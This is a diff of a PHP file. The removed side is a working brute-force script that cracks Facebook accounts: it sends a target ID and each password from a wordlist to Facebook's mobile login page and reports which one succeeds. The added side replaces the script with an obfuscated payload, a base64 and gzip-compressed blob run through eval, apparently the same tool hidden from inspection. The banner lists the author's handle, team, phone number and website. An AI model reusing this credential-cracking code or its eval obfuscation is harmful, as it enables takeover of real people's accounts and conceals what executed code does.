@@ -1,80 +1,11 @@
 <?php
-error_reporting(0);
 /*
-  * Facebook BruteForce
-  * 30 Oktober 2020
+		    Code Successfully Obfuscated By ZeroXGhost1337
+				Thanks For Using 
+                            Tell Your Friend To Use Too.
 */
-function check($user, $pass) {
-	$fileua = 'user-agents.txt';
-	$useragent = $fileua[rand(0, count($fileua) - 1)];
-	$cookie = 'cookie.txt';
-	touch($cookie);
-$ch = curl_init();
-	curl_setopt($ch, CURLOPT_URL, 'https://m.facebook.com/login.php');
-	curl_setopt($ch, CURLOPT_POSTFIELDS, 'email='.$user.'&pass='.$pass.'&login=Login');
-	curl_setopt($ch, CURLOPT_POST, 1);
-	curl_setopt($ch, CURLOPT_HEADER, 0);
-	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-	curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
-	curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
-	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
-	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
-	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-	curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
-	curl_setopt($ch, CURLOPT_REFERER, 'http://m.facebook.com');
-	$output = curl_exec($ch) or die('Can\'t access '.$url);
-	if(stristr($output, '<title>Facebook</title>') || stristr($output, 'id="checkpointSubmitButton"')) {
-		return TRUE;
-	} else {
-		return FALSE;
-	}
-}
-$nc="\e[0m";
-$white="\e[1;37m";
-$black="\e[0;30m";
-$blue="\e[0;34m";
-$light_blue="\e[1;34m";
-$green="\e[0;32m";
-$light_green="\e[1;32m";
-$cyan="\e[0;36m";
-$light_cyan="\e[1;36m";
-$red="\e[0;31m";
-$light_red="\e[1;31m";
-$purple="\e[0;35m";
-$light_purple="\e[1;35m";
-$brown="\e[0;33m";
-$yellow="\e[1;33m";
-$gray="\e[0;30m";
-$light_gray="\e[0;37m";
-$banner = $cyan." 
-
-".$red."[".$blue."  Coded by    : ".$green."ZeroXGhost1337                     ".$white."]
-".$red."[".$blue."  Team        : ".$green."IGE-Crew 1337                      ".$white."]
-".$red."[".$blue."  Thanks To   : ".$green."My Friends                         ".$white."]
-".$red."[".$blue."  Github      : ".$green."https://github.com/zeroxghost1337  ".$white."]
-".$red."[".$blue."  Nomor WA    : ".$green."085718790245                       ".$white."]
-".$red."[".$blue."  My Website  : ".$green."https://zeroxghost.top             ".$white."]\n\n".$nc;
-$file = $_SERVER[argv][1];
-echo "$cyan [+] Masukkan ID Target:$yellow ";
-$user = trim(fgets(STDIN));
-echo "$cyan [+] Tulis wordlist kamu.txt:$yellow ";
-$wordlist = trim(fgets(STDIN));
-if(!empty($user) && !empty($wordlist)) {
-	$passlist = file($wordlist);
-	$passcount = count($passlist);
-	print $banner;
-	print "Tersedia ".$yellow.$passcount." Password untuk bahan cracking! tunggu...\n".$nc;
-	foreach($passlist as $password) {
-		$pass = substr($password, 0, strlen($password) - 1);
-		if(check(urlencode($user), urlencode($pass))) {
-			print $pass." [•] ".$cyan."Horeee berhasil\n".$nc;
-		} else {
-			print $pass." [•] ".$red."Login gagal :'(\n".$nc;
-		}
-	}
-} else {
-	print $banner;
-	print "
-Usage: php ".$file." [username] [wordlist]";
-}
+$ZeRo = "ZXZhbCgiPz4iLmd6dW5jb21wcmVzcyhnenVuY29tcHJlc3MoZ3ppbmZsYXRlKGd6aW5mbGF0ZShnemluZmxhdGUoYmFzZTY0X2RlY29kZShzdHJyZXYoJFhzRWMpKSkpKSkpKTs=";
+$XsEc = "=MhOUSnu7Y1w/kO/9TmLMno8bjDwdWBkXoXScJr7ZJZZ2NwH3gXRcxSU7MX1Nc5LIN+3sib4x7QIAnn64WKROinwvHX+vdeklAtTALll0uQnUvpuE9c/+/vxNQh2umPk1kNb1SklCvaskaTsxmgYOn+I7m8y65nzr13AP17yq47+Gb6eKYKejulR1Ym1UmEK6qEJJnrL2R0pYwC7O2MjwgNnwhDidsuZEHxYbaArBnBh8GGwlI37Ja3WFO8Y0R83ZEh70dElZBqRd/ESJZZOIUADZrBtcqHyiVtakxpAe3VJKz2lTFTa5KbCQu7uCMqXTyKUrOqvQELSnpu5T8Ou8GrVJBWKx/Mj3SgX7XxlEIfp+19ZZ9BSaHYfrUDrqQUdlViKMk3pcQVcLMQPQHnLehik+SQ38D2vqgWG2RdrePUcT+uzhHT0WwxyUEtZVtQyeUGswA+Ew109cQvqAbdM9u9Thgwsm+bfbU7/h3P49PE9whP14B3/dhsedz3ECbbfcv60JMbnTzwD+X5Vl2R7WdHb7xjbTw9+F+7EPdEm0s3hD11fw5RxBmBYS2Owfn6ZF2bO36ub7t7m4lhVK1SunOJaotnVI4zpCyT2jS0iuc+LZr8NtzAoUpyAcwvB2GmzcmNtxMUwRy3YoFmuDRjFogFoQXM9luwFVDYQkEIZRZb+TK2DWfUOZCbG3e23TtlImxI3bPLjVLXNS5dD4y3WfGq5wIP5vZCat1IoPrDcXNSRzN4bfHcy1w+aRaajgv9BAjMNn6QFIHNXTXxx9IvI9hemmySmrTTnBIj9nwc2S8INciWJQ9UXuxde08qr6sRtPBbKvBMWuS5cqR19i+DUXsvLTtywYFg5icqDr7USc1qABvgE47pVPThYFY+QMVXNP1s7YA/b3CsrcRWtPidnU2vPTI8jlCXSP9U4ungHF27MXxtNZKAKT3GiCosbJYT5q/4cOAjCWuka7ItRZZBMLaRJ7K7Tl5RfqQtlkUQb9RwmE/4sz16hyUDf49qCkX3HVDr173QXpFK8LHMzKUoy15LZvZVn5XKN96ndsnzs6/WUjmgx57Z37E+ryuCeQa7PaqufM4h2K/L67saLa3g74ezrB1ZYXWvCwa+ZbBjuIwLAFrFwf//J0OviHOR5OYkBXlnRfSpNa9nniorLCZzdz2lOyCjcknpfYNwACEPz5rqtsBTskilyaX7xGFhCsHKV8NlWctB2qtvQtutdExSFRY4o2KF6PJQ9/krjMLS7Suq01/0VttIBpvcezI5oPTLbTGlMjOE7KI9phOwi2oQv6ZeC54YxiEikhuEVJKficPkIggWc+09SoMVgxc6zLokdWwi/FEFRQWqC8KKOlquXUvLYF84CgFnFWsyVwGreDW/BOE1mFwCG1pJKa2mxdAashzXJxyY6x6wgYDAWv2mQFfyKXPag4xFZ0UuPzwJoYBb3O4nP2ZndmZn/fnp3ALyo+C0fd1JJ6HN9zqeVtngu13KeCvtFiBtgb1EORcQLJEDHOVeyumGcBmYSCWInDzLS78PEGJub9bVnci3+5RghBwJe77GBRGw+pRglBsPZEsZA";
+eval(htmlspecialchars_decode(urldecode(base64_decode($ZeRo))));
+exit;
 ?>
